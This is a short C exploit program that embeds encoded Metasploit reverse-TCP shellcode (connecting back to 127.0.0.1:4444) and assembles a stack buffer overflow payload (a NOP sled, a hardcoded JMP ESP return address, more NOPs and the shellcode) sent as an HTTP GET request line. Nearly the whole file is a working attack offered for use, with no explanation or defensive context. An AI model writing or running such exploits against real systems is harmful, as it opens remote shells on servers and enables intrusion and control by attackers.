#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * linux/x86/shell_reverse_tcp - 198 bytes
 * http://www.metasploit.com
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=127.0.0.1, LPORT=4444,
 * ReverseAllowProxy=false, ReverseConnectRetries=5,
 * ReverseListenerThreaded=false, PrependFork=false,
 * PrependSetresuid=false, PrependSetreuid=false,
 * PrependSetuid=false, PrependSetresgid=false,
 * PrependSetregid=false, PrependSetgid=false,
 * PrependChrootBreak=false, AppendExit=false,
 * InitialAutoRunScript=, AutoRunScript=, CMD=/bin/sh
 */
unsigned char buf[] =
"\x89\xe0\xda\xc7\xd9\x70\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x46\x51\x59\x4b\x38\x77\x79\x73\x46\x33\x47\x33\x36\x33\x32"
"\x4a\x54\x42\x6f\x79\x78\x61\x6c\x70\x50\x66\x68\x4d\x4d\x50"
"\x6e\x73\x42\x79\x4e\x50\x75\x6f\x6a\x6d\x6b\x30\x72\x69\x42"
"\x59\x59\x69\x30\x68\x33\x4f\x77\x70\x57\x70\x46\x61\x42\x48"
"\x55\x52\x73\x30\x76\x71\x43\x6c\x6e\x69\x68\x61\x6c\x70\x70"
"\x66\x70\x50\x46\x31\x56\x33\x38\x33\x54\x43\x4b\x39\x58\x61"
"\x48\x4d\x4f\x70\x52\x72\x71\x78\x30\x6e\x44\x6f\x52\x53\x50"
"\x68\x45\x38\x44\x6f\x74\x6f\x65\x32\x72\x49\x4e\x69\x48\x63"
"\x71\x42\x51\x43\x6f\x79\x78\x61\x38\x30\x56\x6b\x38\x4d\x4f"
"\x70\x41\x41";

#define NOP "\x90"
#define JMP_ESP "\xa7\x2b\x12\x42"

int main(int argc, char** argv)
{
	char *payload = malloc(2000);
	int i;

	for ( i = 0; i < 1032; i++)
	{
		strcat(payload, NOP);
	}

	strcat(payload, JMP_ESP);

	for ( i = 0; i < 500; i++)
	{
		strcat(payload, NOP);
	}

	strcat(payload, buf);

	printf("%s%s %s", "GET /", payload, " HTTP/1.1");
}
